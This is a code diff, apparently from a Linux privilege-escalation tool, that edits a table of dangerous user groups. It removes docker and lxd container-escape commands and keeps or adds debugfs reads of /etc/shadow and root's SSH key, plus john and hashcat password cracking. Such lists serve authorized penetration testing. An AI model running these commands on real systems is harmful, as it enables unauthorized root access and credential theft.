@@ -16,36 +16,16 @@ _CURRENT_GROUPS_RE = re.compile(r"current\s+user\s+groups\s*:\s*(.+)", re.IGNORE
 _SEVERITY_ORDER = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
 
 DANGEROUS_GROUPS: Dict[str, Dict] = {
-    "docker": {
-        "severity": "CRITICAL",
-        "description": "Docker group allows container escape to root",
-        "commands": [
-            "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
-            "docker run -v /etc/passwd:/etc/passwd --rm -it alpine sh",
-        ],
-    },
-    "lxd": {
-        "severity": "CRITICAL",
-        "description": "LXD group allows container escape to root",
-        "commands": [
-            "# Step 1: build alpine image on attacker machine:",
-            "git clone https://github.com/saghul/lxd-alpine-builder && cd lxd-alpine-builder && ./build-alpine",
-            "# Step 2: transfer and import on target:",
-            "lxc image import ./alpine*.tar.gz --alias myimage",
-            "lxc init myimage mycontainer -c security.privileged=true",
-            "lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true",
-            "lxc start mycontainer",
-            "lxc exec mycontainer /bin/sh",
-        ],
-    },
+    # docker → handled by modules/linux/docker_group.py (detailed exploit)
+    # lxd    → handled by modules/linux/lxd_group.py   (detailed exploit)
     "disk": {
         "severity": "CRITICAL",
         "description": "Disk group allows reading raw disk - full filesystem access",
         "commands": [
-            "df -h (find the main disk, e.g. /dev/sda1)",
+            "df -h  # find the main disk device (e.g. /dev/sda1)",
             "debugfs /dev/sda1",
-            "debugfs: cat /etc/shadow",
-            "debugfs: cat /root/.ssh/id_rsa",
+            "cat /etc/shadow  # inside debugfs prompt",
+            "cat /root/.ssh/id_rsa  # inside debugfs prompt",
         ],
     },
     "shadow": {
@@ -53,8 +33,8 @@ DANGEROUS_GROUPS: Dict[str, Dict] = {
         "description": "Shadow group can read /etc/shadow - crack root hash",
         "commands": [
             "cat /etc/shadow",
-            "# Copy hash and crack with hashcat:",
-            "hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt",
+            "john /etc/shadow --wordlist=/usr/share/wordlists/rockyou.txt",
+            "# Or: hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt",
         ],
     },
     "adm": {
